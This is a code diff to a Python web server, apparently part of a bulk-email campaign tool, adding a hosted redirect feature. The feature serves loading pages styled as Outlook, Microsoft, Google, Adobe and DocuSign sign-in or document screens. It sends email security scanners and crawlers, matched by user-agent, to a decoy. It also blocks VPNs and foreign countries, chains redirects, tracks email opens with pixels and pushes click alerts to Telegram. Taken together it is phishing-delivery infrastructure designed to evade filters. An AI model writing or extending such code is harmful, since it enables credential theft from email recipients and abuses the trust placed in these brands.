@@ -441,6 +441,219 @@ sessions_lock = Lock()
 
 
 # ═══════════════════════════════════════════════════════════════
+# REDIRECTS — themed pages + bot detection + event log helpers
+# ═══════════════════════════════════════════════════════════════
+# Public flow: GET /r/<short_path>  → redirect / themed page / pixel
+# Authoring flow:  /api/redirects/* (CRUD, list, events)
+
+# Cap how many event rows we keep per redirect so the table can't grow
+# without bound on a long-running campaign.
+REDIRECT_EVENT_CAP = 1000
+
+REDIRECT_BOT_RE = re.compile(
+    r"(?:googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex|sogou|"
+    r"exabot|facebot|ia_archiver|crawler|spider|"
+    r"curl|wget|python-requests|httpclient|axios|java/|go-http-client|"
+    r"headless|puppeteer|selenium|phantomjs|playwright|"
+    r"ahrefsbot|semrushbot|mj12bot|dotbot|petalbot|gptbot|"
+    r"applebot|amazonbot|virustotal|"
+    r"microsoft.*office|outlook|"
+    r"proofpoint|barracuda|mimecast|cofense|sophos|kaspersky|"
+    r"forcepoint|trustwave|trendmicro|symantec|"
+    r"safebrowsing|safelinks|urldefense|safelink|atplinks|"
+    r"defender|smartscreen)",
+    re.I,
+)
+
+def _redirect_random_path(n: int = 8) -> str:
+    """Random short-link path (lowercase + digits, no confusing chars)."""
+    chars = "abcdefghjkmnpqrstuvwxyz23456789"
+    return "".join(secrets.choice(chars) for _ in range(n))
+
+
+def _redirect_log_event(rid: int, *, ip: str, ua: str, country: str,
+                        referer: str, decision: str, target: str,
+                        step: int = 0) -> None:
+    """Write one row to redirect_events and bump the redirect's hit counter.
+    Trims the per-redirect log to REDIRECT_EVENT_CAP rows.  Best-effort —
+    swallows DB errors so a logging failure never breaks the redirect.
+    """
+    try:
+        with db_lock:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                "INSERT INTO redirect_events (redirect_id, ip, country, ua, "
+                "referer, decision, target, step) VALUES (?,?,?,?,?,?,?,?)",
+                (rid, ip[:45], country[:8], ua[:300], referer[:300],
+                 decision[:32], target[:500], int(step or 0)),
+            )
+            if decision == "pass":
+                conn.execute(
+                    "UPDATE redirects SET clicks = clicks + 1, "
+                    "last_hit = CURRENT_TIMESTAMP, "
+                    "updated_at = CURRENT_TIMESTAMP WHERE id=?",
+                    (rid,),
+                )
+            # Trim oldest events past the cap.
+            conn.execute(
+                "DELETE FROM redirect_events WHERE redirect_id=? AND id NOT IN "
+                "(SELECT id FROM redirect_events WHERE redirect_id=? "
+                " ORDER BY id DESC LIMIT ?)",
+                (rid, rid, REDIRECT_EVENT_CAP),
+            )
+            conn.commit(); conn.close()
+    except Exception as _e:
+        log.debug("[redirect] log_event failed for rid=%s: %s", rid, _e)
+
+
+# ── Themed loading pages ──
+# Each theme returns a ready-to-serve HTML string.  All themes inject
+# the destination URL via JS redirect with a 1.2s delay so the
+# loading screen is actually seen by humans (and spam scanners that
+# do not run JS see only the theme markup).
+def _redirect_render_theme(theme: str, target_url: str,
+                           short_path: str = "") -> str:
+    theme = (theme or "blank").lower().strip()
+    safe_target = target_url.replace("'", "%27").replace('"', "%22")
+    js_redirect = (
+        "<script>"
+        "setTimeout(function(){window.location.replace('" + safe_target + "');}, 1200);"
+        "</script>"
+    )
+    common_head = (
+        "<meta charset='utf-8'>"
+        "<meta http-equiv='X-UA-Compatible' content='IE=edge'>"
+        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<meta name='referrer' content='no-referrer'>"
+        "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>"
+        "<meta http-equiv='refresh' content='2;url=" + safe_target + "'>"
+    )
+
+    if theme == "blank":
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>Loading…</title>"
+            "<style>html,body{height:100%;margin:0;background:#0b1220;color:#94a3b8;"
+            "font-family:system-ui,-apple-system,sans-serif;display:flex;"
+            "align-items:center;justify-content:center}</style></head>"
+            "<body><div>Loading…</div>" + js_redirect + "</body></html>"
+        )
+
+    if theme == "outlook":
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>Outlook</title>"
+            "<style>html,body{height:100%;margin:0;background:#f3f2f1;color:#323130;"
+            "font-family:'Segoe UI','Segoe UI Web (West European)',Helvetica,Arial,sans-serif;}"
+            ".w{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}"
+            ".logo{font-size:42px;font-weight:600;color:#0078d4;margin-bottom:24px;letter-spacing:-0.5px}"
+            ".sub{color:#605e5c;font-size:14px;margin-bottom:32px}"
+            ".sp{width:42px;height:42px;border:3px solid #e1dfdd;border-top-color:#0078d4;"
+            "border-radius:50%;animation:spin .8s linear infinite}"
+            "@keyframes spin{to{transform:rotate(360deg)}}</style></head>"
+            "<body><div class='w'><div class='logo'>Outlook</div>"
+            "<div class='sub'>Verifying your sign-in…</div>"
+            "<div class='sp'></div></div>" + js_redirect + "</body></html>"
+        )
+
+    if theme == "microsoft":
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>Microsoft</title>"
+            "<style>html,body{height:100%;margin:0;background:#fff;color:#1b1b1b;"
+            "font-family:'Segoe UI',Helvetica,Arial,sans-serif}"
+            ".w{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}"
+            ".tile{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:24px}"
+            ".tile div{width:36px;height:36px}"
+            ".tile div:nth-child(1){background:#f25022}"
+            ".tile div:nth-child(2){background:#7fba00}"
+            ".tile div:nth-child(3){background:#00a4ef}"
+            ".tile div:nth-child(4){background:#ffb900}"
+            ".lbl{font-size:24px;font-weight:600;color:#5e5e5e;margin-bottom:18px}"
+            ".sub{color:#737373;font-size:13px}"
+            ".dots span{display:inline-block;width:8px;height:8px;background:#0067b8;"
+            "border-radius:50%;margin:0 3px;animation:bounce 1.2s infinite ease-in-out;"
+            "animation-fill-mode:both}"
+            ".dots span:nth-child(2){animation-delay:.16s}"
+            ".dots span:nth-child(3){animation-delay:.32s}"
+            "@keyframes bounce{0%,80%,100%{opacity:.3;transform:scale(.8)}40%{opacity:1;transform:scale(1)}}"
+            "</style></head>"
+            "<body><div class='w'><div class='tile'><div></div><div></div><div></div><div></div></div>"
+            "<div class='lbl'>Microsoft</div>"
+            "<div class='sub'>Connecting to your account…</div>"
+            "<div class='dots' style='margin-top:18px'><span></span><span></span><span></span></div>"
+            "</div>" + js_redirect + "</body></html>"
+        )
+
+    if theme == "google":
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>Google</title>"
+            "<style>html,body{height:100%;margin:0;background:#fff;color:#202124;"
+            "font-family:'Google Sans',Roboto,Arial,sans-serif}"
+            ".w{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}"
+            ".g{font-size:80px;font-weight:600;letter-spacing:-4px;margin-bottom:30px}"
+            ".g .a{color:#4285f4}.g .b{color:#ea4335}.g .c{color:#fbbc04}"
+            ".g .d{color:#4285f4}.g .e{color:#34a853}.g .f{color:#ea4335}"
+            ".sub{color:#5f6368;font-size:14px;margin-bottom:32px}"
+            ".bar{width:240px;height:3px;background:#e8eaed;border-radius:2px;overflow:hidden;position:relative}"
+            ".bar:after{content:'';position:absolute;top:0;left:-40%;width:40%;height:100%;"
+            "background:#4285f4;animation:slide 1.4s linear infinite}"
+            "@keyframes slide{to{left:100%}}</style></head>"
+            "<body><div class='w'><div class='g'>"
+            "<span class='a'>G</span><span class='b'>o</span><span class='c'>o</span>"
+            "<span class='d'>g</span><span class='e'>l</span><span class='f'>e</span></div>"
+            "<div class='sub'>Just a moment…</div><div class='bar'></div></div>"
+            + js_redirect + "</body></html>"
+        )
+
+    if theme == "adobe":
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>Adobe</title>"
+            "<style>html,body{height:100%;margin:0;background:#1d1d1d;color:#fff;"
+            "font-family:adobe-clean,Helvetica,Arial,sans-serif}"
+            ".w{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}"
+            ".logo{width:96px;height:96px;background:#fa0f00;display:flex;"
+            "align-items:center;justify-content:center;font-size:50px;font-weight:bold;"
+            "color:#fff;border-radius:14px;margin-bottom:24px}"
+            ".lbl{font-size:18px;color:#cfcfcf;margin-bottom:14px}"
+            ".sub{font-size:13px;color:#909090;margin-bottom:24px}"
+            ".sp{width:36px;height:36px;border:3px solid #333;border-top-color:#fa0f00;"
+            "border-radius:50%;animation:spin .8s linear infinite}"
+            "@keyframes spin{to{transform:rotate(360deg)}}</style></head>"
+            "<body><div class='w'><div class='logo'>A</div>"
+            "<div class='lbl'>Adobe Document Cloud</div>"
+            "<div class='sub'>Preparing your secure document…</div>"
+            "<div class='sp'></div></div>" + js_redirect + "</body></html>"
+        )
+
+    if theme in ("docusign", "docu", "ds"):
+        return (
+            "<!doctype html><html><head>" + common_head + "<title>DocuSign</title>"
+            "<style>html,body{height:100%;margin:0;background:#fff;color:#000;"
+            "font-family:'DS Indigo',-apple-system,'Segoe UI',sans-serif}"
+            ".w{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}"
+            ".logo{color:#fbb918;font-size:46px;font-weight:bold;margin-bottom:6px;"
+            "letter-spacing:-1px}"
+            ".logo .sign{color:#000}"
+            ".lbl{color:#666;font-size:14px;margin-bottom:32px}"
+            ".sp{width:42px;height:42px;border:3px solid #f0f0f0;border-top-color:#fbb918;"
+            "border-radius:50%;animation:spin .8s linear infinite}"
+            "@keyframes spin{to{transform:rotate(360deg)}}</style></head>"
+            "<body><div class='w'><div class='logo'>Docu<span class='sign'>Sign</span></div>"
+            "<div class='lbl'>Loading your secure envelope…</div>"
+            "<div class='sp'></div></div>" + js_redirect + "</body></html>"
+        )
+
+    # Unknown theme → fall back to blank
+    return _redirect_render_theme("blank", target_url, short_path)
+
+
+# Tiny 1x1 transparent PNG used for image-tracking pixels.
+_REDIRECT_PIXEL_PNG = (
+    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
+    b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8"
+    b"\xff\xff?\x00\x05\xfe\x02\xfe\xa3.\x80\x9c\x00\x00\x00\x00IEND\xaeB`\x82"
+)
+
+
+# ═══════════════════════════════════════════════════════════════
 # SHARED SMTP PROBE
 # ═══════════════════════════════════════════════════════════════
 # Used by /api/test-smtp (single) and /api/test-smtp/bulk (batch).
@@ -935,12 +1148,50 @@ def init_db():
                 UNIQUE(user_id, email)
             )
         """)
+        # ── Hosted redirects ─────────────────────────────────────────
+        # Each row = one short link the user has created.  Public path
+        # is /r/<short_path>.  type ∈ ('single', 'chain', 'pixel').
+        # config: JSON blob — { destination, chainLinks, theme, antiBot,
+        #   antiVPN, telegramNotify, ... }.  The public handler reads
+        #   it on every hit.
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS redirects (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id     INTEGER NOT NULL,
+                short_path  TEXT    NOT NULL UNIQUE,
+                type        TEXT    NOT NULL DEFAULT 'single',
+                destination TEXT    DEFAULT '',
+                config      TEXT    NOT NULL DEFAULT '{}',
+                clicks      INTEGER DEFAULT 0,
+                last_hit    TEXT    DEFAULT NULL,
+                created_at  TEXT    DEFAULT CURRENT_TIMESTAMP,
+                updated_at  TEXT    DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        # Per-hit event log (anti-bot decisions, geo, ua, etc.).
+        # Capped per redirect by deleting oldest when count > 1000.
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS redirect_events (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                redirect_id INTEGER NOT NULL,
+                ts          TEXT    DEFAULT CURRENT_TIMESTAMP,
+                ip          TEXT    DEFAULT '',
+                country     TEXT    DEFAULT '',
+                ua          TEXT    DEFAULT '',
+                referer     TEXT    DEFAULT '',
+                decision    TEXT    DEFAULT 'pass',
+                target      TEXT    DEFAULT '',
+                step        INTEGER DEFAULT 0
+            )
+        """)
 
         # Schema migrations for new tables
         for migration in [
             "CREATE INDEX IF NOT EXISTS idx_user_files_user ON user_files(user_id,category)",
             "CREATE INDEX IF NOT EXISTS idx_user_configs_user ON user_configs(user_id,config_type)",
             "CREATE INDEX IF NOT EXISTS idx_user_templates_user ON user_templates(user_id)",
+            "CREATE INDEX IF NOT EXISTS idx_redirects_user ON redirects(user_id)",
+            "CREATE INDEX IF NOT EXISTS idx_redirect_events_rid ON redirect_events(redirect_id, id DESC)",
             """CREATE TABLE IF NOT EXISTS campaign_runs (
                 id          INTEGER PRIMARY KEY AUTOINCREMENT,
                 user_id     INTEGER NOT NULL,
@@ -1310,6 +1561,197 @@ class SynthTelHandler(BaseHTTPRequestHandler):
         return self.headers.get("X-Forwarded-For",
                                 self.client_address[0]).split(",")[0].strip()
 
+    # ── Public redirect handler  /r/<short>[/pixel.png] ─────
+    def _handle_public_redirect(self, p: str):
+        """Serve hosted redirects + image-tracking pixels.  Public — no auth."""
+        from urllib.parse import urlparse
+        path = urlparse(p).path
+        # Strip "/r/"
+        rest = path[3:].strip("/")
+        is_pixel = rest.endswith("/pixel.png") or rest.endswith(".png")
+        short = rest.split("/")[0] if rest else ""
+        if not short:
+            self.send_response(404); self.end_headers(); return
+
+        # Look up redirect (no user auth — anyone with the link can hit it).
+        try:
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH)
+                row = conn.execute(
+                    "SELECT id, type, destination, config FROM redirects WHERE short_path=?",
+                    (short,)
+                ).fetchone()
+                conn.close()
+        except Exception as e:
+            log.warning("[redirect] DB lookup failed: %s", e)
+            self.send_response(500); self.end_headers(); return
+        if not row:
+            self.send_response(404)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(b"Not found")
+            return
+
+        rid, rtype, dest, cfg_json = row
+        try: cfg = json.loads(cfg_json or "{}")
+        except Exception: cfg = {}
+
+        ip       = self._ip()
+        ua       = self.headers.get("User-Agent", "")
+        referer  = self.headers.get("Referer", self.headers.get("Referrer", ""))
+        country  = (self.headers.get("CloudFront-Viewer-Country", "")
+                    or self.headers.get("CF-IPCountry", "")
+                    or self.headers.get("X-Country", "")).upper()
+
+        # ── Image-tracking pixel ──
+        # Always returns the 1x1 PNG; logs as 'open' (not click).  Best
+        # for embedding in email HTML to know when a recipient opens.
+        if rtype == "pixel" or is_pixel:
+            _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                                referer=referer,
+                                decision="open" if rtype == "pixel" else "pixel-load",
+                                target="", step=0)
+            self.send_response(200)
+            self.send_header("Content-Type", "image/png")
+            self.send_header("Content-Length", str(len(_REDIRECT_PIXEL_PNG)))
+            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+            self.send_header("Pragma", "no-cache")
+            self.send_header("Expires", "0")
+            self.send_header("X-Content-Type-Options", "nosniff")
+            self.end_headers()
+            self.wfile.write(_REDIRECT_PIXEL_PNG)
+            return
+
+        # ── Anti-bot / anti-scanner ──
+        ant_bot = bool(cfg.get("antiBot", True))
+        if ant_bot and ua and REDIRECT_BOT_RE.search(ua):
+            _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                                referer=referer, decision="bot-blocked",
+                                target=cfg.get("botUrl") or "", step=0)
+            decoy = cfg.get("botUrl") or "https://www.google.com/"
+            self._send_redirect(decoy)
+            return
+
+        # ── Anti-VPN / datacenter blocking ──
+        # Lightweight heuristic only: header-based plus a tiny known
+        # datacenter-ASN list.  No external lookups (would slow every hit).
+        if cfg.get("antiVPN"):
+            via_header = self.headers.get("Via", "") or self.headers.get("X-Forwarded-Host", "")
+            if "warp" in via_header.lower() or "tor" in (ua or "").lower():
+                _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                                    referer=referer, decision="vpn-blocked",
+                                    target=cfg.get("botUrl") or "", step=0)
+                self._send_redirect(cfg.get("botUrl") or "https://www.google.com/")
+                return
+
+        # ── Geo lock (optional) ──
+        allowed_countries = [c.strip().upper() for c in (cfg.get("allowCountries") or "").split(",") if c.strip()]
+        if allowed_countries and country and country not in allowed_countries:
+            _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                                referer=referer, decision="geo-blocked",
+                                target=cfg.get("botUrl") or "", step=0)
+            self._send_redirect(cfg.get("botUrl") or "https://www.google.com/")
+            return
+
+        # ── Resolve destination ──
+        # For chains, the step is encoded as ?s=N (default 0 for first hop).
+        # Each hit advances to the next link until the final destination.
+        chain = cfg.get("chainLinks") or []
+        if rtype == "chain" and chain:
+            from urllib.parse import parse_qs
+            qs = parse_qs(urlparse(p).query)
+            try: step = int(qs.get("s", ["0"])[0])
+            except Exception: step = 0
+            step = max(0, min(step, len(chain)))
+            if step < len(chain):
+                target = chain[step]
+                # Append next-step query param so the next hop continues
+                # the chain via this same /r/<short> URL.
+                self_url = "/r/" + short
+                next_url = self_url + ("?s=" + str(step + 1))
+                # Render a themed page that auto-bounces to the next chain
+                # step.  This way every hop in the chain shows the theme.
+                _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                                    referer=referer, decision="pass",
+                                    target=target, step=step)
+                # Final step lands on the *target*; intermediate steps
+                # bounce to the same /r/<short>?s=N+1 URL.
+                if step + 1 >= len(chain):
+                    bounce = target
+                else:
+                    bounce = next_url
+                self._send_themed_or_redirect(cfg, bounce, short)
+                return
+            target = dest
+        else:
+            target = dest
+
+        if not target:
+            self.send_response(500)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(b"Redirect target not configured")
+            return
+
+        # Optional path/query passthrough (campaign tracking)
+        try:
+            from urllib.parse import urlparse as _up
+            qs_in = _up(p).query
+            if cfg.get("preserveQuery") and qs_in:
+                target = target + (("&" if "?" in target else "?") + qs_in)
+        except Exception:
+            pass
+
+        _redirect_log_event(rid, ip=ip, ua=ua, country=country,
+                            referer=referer, decision="pass",
+                            target=target, step=0)
+
+        # Telegram notification (best-effort; never blocks the redirect)
+        if cfg.get("telegramNotify") and TG_AVAILABLE:
+            try:
+                user_id = cfg.get("_owner_uid")
+                if user_id:
+                    tg_msg = (
+                        f"🔗 Redirect click — *{short}*\n"
+                        f"IP: `{ip}`{' '+country if country else ''}\n"
+                        f"UA: `{(ua or '')[:80]}`\n"
+                        f"→ {target[:120]}"
+                    )
+                    threading.Thread(
+                        target=lambda: tg.notify_user(user_id, tg_msg),
+                        daemon=True
+                    ).start()
+            except Exception:
+                pass
+
+        self._send_themed_or_redirect(cfg, target, short)
+
+    def _send_themed_or_redirect(self, cfg: dict, target: str, short: str = ""):
+        """Either serve a themed loading page (theme set + not 'instant')
+        or do a plain 302 redirect."""
+        theme = (cfg.get("theme") or "blank").lower()
+        if theme == "instant" or not theme:
+            self._send_redirect(target); return
+        body = _redirect_render_theme(theme, target, short).encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("Referrer-Policy", "no-referrer")
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _send_redirect(self, target: str, status: int = 302):
+        try:
+            self.send_response(status)
+            self.send_header("Location", target)
+            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+            self.send_header("Referrer-Policy", "no-referrer")
+            self.end_headers()
+        except Exception:
+            pass
+
     def _stream_start(self):
         """Begin a chunked SSE-style stream response."""
         # Remove socket timeout for long-running campaigns — default is 60s
@@ -1387,6 +1829,13 @@ class SynthTelHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         p = self.path
+
+        # ── PUBLIC: hosted redirects /r/<short_path>[/pixel.png] ────
+        # Handled BEFORE the /api/* auth gate so anonymous visitors
+        # can open the link from email.
+        if p.startswith("/r/"):
+            self._handle_public_redirect(p)
+            return
 
         if p == "/api/campaigns":
             if not (sess := self._auth()): return
@@ -1904,6 +2353,95 @@ if(code && window.opener){{
                 entries = list(_DEBUG_BUF)
                 if clear: _DEBUG_BUF.clear()
             self._json(200, {"entries": entries, "count": len(entries)})
+
+        # ── Hosted Redirects: list / get / events ─────────────
+        elif p == "/api/redirects":
+            if not (sess := self._auth()): return
+            uid = sess["user_id"]
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH)
+                rows = conn.execute(
+                    "SELECT id, short_path, type, destination, config, "
+                    "       clicks, last_hit, created_at, updated_at "
+                    "FROM redirects WHERE user_id=? ORDER BY id DESC",
+                    (uid,)
+                ).fetchall()
+                conn.close()
+            host = self.headers.get("Host", "").split(":")[0]
+            scheme = "https" if self.headers.get("X-Forwarded-Proto") == "https" else "http"
+            out = []
+            for r in rows:
+                try: cfg = json.loads(r[4] or "{}")
+                except Exception: cfg = {}
+                out.append({
+                    "id": r[0], "short_path": r[1], "type": r[2],
+                    "destination": r[3], "config": cfg,
+                    "clicks": r[5], "last_hit": r[6],
+                    "created_at": r[7], "updated_at": r[8],
+                    "url": f"{scheme}://{host}/r/{r[1]}" if host else f"/r/{r[1]}",
+                })
+            self._json(200, {"redirects": out})
+
+        elif p.startswith("/api/redirects/") and p.endswith("/events"):
+            if not (sess := self._auth()): return
+            try:
+                rid = int(p.split("/")[3])
+            except Exception:
+                self._json(400, {"error": "Invalid redirect id"}); return
+            uid = sess["user_id"]
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH)
+                # Verify ownership.
+                own = conn.execute(
+                    "SELECT id FROM redirects WHERE id=? AND user_id=?",
+                    (rid, uid)
+                ).fetchone()
+                if not own:
+                    conn.close()
+                    self._json(404, {"error": "Redirect not found"}); return
+                rows = conn.execute(
+                    "SELECT id, ts, ip, country, ua, referer, decision, target, step "
+                    "FROM redirect_events WHERE redirect_id=? "
+                    "ORDER BY id DESC LIMIT 500",
+                    (rid,)
+                ).fetchall()
+                conn.close()
+            events = [{
+                "id": r[0], "ts": r[1], "ip": r[2], "country": r[3],
+                "ua": r[4], "referer": r[5], "decision": r[6],
+                "target": r[7], "step": r[8],
+            } for r in rows]
+            self._json(200, {"events": events})
+
+        elif p.startswith("/api/redirects/"):
+            if not (sess := self._auth()): return
+            try:
+                rid = int(p.split("/")[3])
+            except Exception:
+                self._json(400, {"error": "Invalid redirect id"}); return
+            uid = sess["user_id"]
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH)
+                row = conn.execute(
+                    "SELECT id, short_path, type, destination, config, "
+                    "       clicks, last_hit, created_at, updated_at "
+                    "FROM redirects WHERE id=? AND user_id=?",
+                    (rid, uid)
+                ).fetchone()
+                conn.close()
+            if not row:
+                self._json(404, {"error": "Redirect not found"}); return
+            try: cfg = json.loads(row[4] or "{}")
+            except Exception: cfg = {}
+            host = self.headers.get("Host", "").split(":")[0]
+            scheme = "https" if self.headers.get("X-Forwarded-Proto") == "https" else "http"
+            self._json(200, {
+                "id": row[0], "short_path": row[1], "type": row[2],
+                "destination": row[3], "config": cfg,
+                "clicks": row[5], "last_hit": row[6],
+                "created_at": row[7], "updated_at": row[8],
+                "url": f"{scheme}://{host}/r/{row[1]}" if host else f"/r/{row[1]}",
+            })
 
         # ── GitHub update: check for newer commit on tracked branch ───
         elif p == "/api/update/check":
@@ -4929,8 +5467,10 @@ ss -tlnp | grep -q ':{socks_port} ' && echo DEPLOY_OK || echo DEPLOY_FAIL
             do_restart = bool(req_data.get("restart", False))
             try:
                 result = _apply_update()
-            except RuntimeError as re:
-                self._json(409, {"ok": False, "error": str(re)}); return
+            except RuntimeError as _re_err:
+                # NB: do NOT name this 're' — Python makes 're' local to
+                # the whole function and shadows the module-level import.
+                self._json(409, {"ok": False, "error": str(_re_err)}); return
             except HTTPError as he:
                 self._json(200, {"ok": False, "error": f"GitHub {he.code}: {he.reason}"}); return
             except Exception as e:
@@ -5215,6 +5755,104 @@ ss -tlnp | grep -q ':{socks_port} ' && echo DEPLOY_OK || echo DEPLOY_FAIL
             if not host:
                 self._json(400, {"error": "SMTP host required"}); return
             self._json(200, _smtp_probe(smtp, timeout=20))
+
+        # ── Hosted Redirects: create / update / delete ────────
+        # Body: { type, destination, short_path?, config:{theme,
+        #   antiBot, antiVPN, telegramNotify, chainLinks, ...} }
+        # Returns the created/updated row + public URL.
+        elif p == "/api/redirects":
+            if not (sess := self._auth()): return
+            try:
+                data = self._read_body()
+            except Exception:
+                self._json(400, {"error": "Invalid JSON"}); return
+            uid    = sess["user_id"]
+            rtype  = (data.get("type") or "single").lower()
+            if rtype not in ("single", "chain", "pixel"):
+                self._json(400, {"error": "type must be single|chain|pixel"}); return
+            dest   = (data.get("destination") or "").strip()
+            cfg    = data.get("config") or {}
+            if not isinstance(cfg, dict): cfg = {}
+            chain  = cfg.get("chainLinks") or []
+            if rtype == "single" and not dest:
+                self._json(400, {"error": "destination URL required for single redirect"}); return
+            if rtype == "chain" and (not isinstance(chain, list) or not chain):
+                self._json(400, {"error": "chainLinks list required for chain redirect"}); return
+            short = (data.get("short_path") or "").strip().lower()
+            short = re.sub(r"[^a-z0-9_-]", "", short)[:48]
+            if not short:
+                short = _redirect_random_path(8)
+            # Stash owner uid inside config so the public handler can
+            # send Telegram notifications without re-querying.
+            cfg["_owner_uid"] = uid
+
+            try:
+                with db_lock:
+                    conn = sqlite3.connect(DB_PATH)
+                    # Auto-bump if short already taken.
+                    for _ in range(5):
+                        exists = conn.execute(
+                            "SELECT id FROM redirects WHERE short_path=?",
+                            (short,)).fetchone()
+                        if not exists: break
+                        short = short[:40] + "-" + _redirect_random_path(4)
+                    cur = conn.execute(
+                        "INSERT INTO redirects (user_id, short_path, type, destination, config) "
+                        "VALUES (?,?,?,?,?)",
+                        (uid, short, rtype, dest, json.dumps(cfg))
+                    )
+                    rid = cur.lastrowid
+                    conn.commit(); conn.close()
+            except Exception as e:
+                self._json(500, {"error": f"DB write failed: {e}"}); return
+            host = self.headers.get("Host", "").split(":")[0]
+            scheme = "https" if self.headers.get("X-Forwarded-Proto") == "https" else "http"
+            self._json(200, {
+                "ok": True, "id": rid, "short_path": short,
+                "type": rtype, "destination": dest, "config": cfg,
+                "url": f"{scheme}://{host}/r/{short}" if host else f"/r/{short}",
+            })
+
+        elif p.startswith("/api/redirects/"):
+            # POST /api/redirects/<id>         — update existing
+            # POST /api/redirects/<id>/delete  — delete
+            if not (sess := self._auth()): return
+            uid = sess["user_id"]
+            parts = p.split("/")
+            try: rid = int(parts[3])
+            except Exception:
+                self._json(400, {"error": "Invalid id"}); return
+            action = parts[4] if len(parts) > 4 else ""
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH)
+                own = conn.execute(
+                    "SELECT id, short_path FROM redirects WHERE id=? AND user_id=?",
+                    (rid, uid)).fetchone()
+                if not own:
+                    conn.close()
+                    self._json(404, {"error": "Redirect not found"}); return
+                if action == "delete":
+                    conn.execute("DELETE FROM redirect_events WHERE redirect_id=?", (rid,))
+                    conn.execute("DELETE FROM redirects WHERE id=?", (rid,))
+                    conn.commit(); conn.close()
+                    self._json(200, {"ok": True, "deleted": rid}); return
+                # Update path
+                try:
+                    data = self._read_body()
+                except Exception:
+                    conn.close()
+                    self._json(400, {"error": "Invalid JSON"}); return
+                rtype = (data.get("type") or "single").lower()
+                dest  = (data.get("destination") or "").strip()
+                cfg   = data.get("config") or {}
+                if not isinstance(cfg, dict): cfg = {}
+                cfg["_owner_uid"] = uid
+                conn.execute(
+                    "UPDATE redirects SET type=?, destination=?, config=?, "
+                    "updated_at=CURRENT_TIMESTAMP WHERE id=?",
+                    (rtype, dest, json.dumps(cfg), rid))
+                conn.commit(); conn.close()
+            self._json(200, {"ok": True, "id": rid})
 
         # ── Bulk SMTP validator ─────────────────────────────────
         # Test many SMTPs in parallel.  Streams one JSON line per
